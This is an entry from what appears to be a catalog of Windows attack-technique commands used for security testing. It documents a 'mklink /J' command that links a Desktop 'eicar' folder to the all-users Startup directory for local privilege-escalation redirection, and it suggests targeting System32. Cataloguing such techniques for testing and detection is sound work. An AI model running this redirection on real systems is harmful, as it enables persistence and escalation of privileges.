---
id: mklink-junction
data: >-
  mklink /J %userprofile%\Desktop\eicar "C:\ProgramData\Microsoft\Windows\Start
  Menu\Programs\StartUp"
tags:
  - junction
  - symlink
  - lpe
type: command
output: Junction created successfully
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.711Z'
verified: false
validated: true
submitted: true
---
# mklink-create-junction

## Command

```cmd
mklink /J %userprofile%\Desktop\eicar "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

## Description

Creates a directory junction (NTFS reparse point) linking the local 'eicar' folder to the Windows Startup directory for privilege escalation redirection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /J | Junction type | Yes |
| %userprofile%\Desktop\eicar | Source link name | Yes |
| "C:\...\StartUp" | Target privileged path | Yes |

## Examples

### Basic Usage

```cmd
mklink /J link target
```

### Advanced Usage

Target SYSTEM paths like C:\Windows\System32.

## Expected Output

'Junction created for eicar <<===>> C:\...\StartUp'.

## Related

- [[commands/rmdir-delete-eicar]]
